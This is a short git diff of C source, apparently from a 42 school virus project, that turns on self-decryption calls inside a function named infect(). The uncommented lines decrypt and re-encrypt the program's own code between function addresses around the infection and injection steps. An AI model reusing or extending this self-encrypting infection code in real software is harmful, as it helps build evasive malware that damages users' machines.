@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/12 18:22:03 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/04/01 18:08:02 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/04/02 11:32:48 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -15,7 +15,7 @@
 void		infect(t_data *data)
 {
 
-	/* revert_two(&data->key, (char*)inspect, (size_t)infect - (size_t)inspect); */
+	revert_two(&data->key, (char*)inspect, (size_t)infect - (size_t)inspect);
 
 #ifdef DEBUG
 	char de[] = "infect\t \n";
@@ -64,8 +64,8 @@ void		infect(t_data *data)
 
 ERR:
 
-	/* update_two(&data->key, (char*)infect, (size_t)inject - (size_t)infect); */
-	/* revert_two(&data->key, (char*)inject, (size_t)release - (size_t)inject); */
+	update_two(&data->key, (char*)infect, (size_t)inject - (size_t)infect);
+	revert_two(&data->key, (char*)inject, (size_t)release - (size_t)inject);
 
 	inject(data);
 }
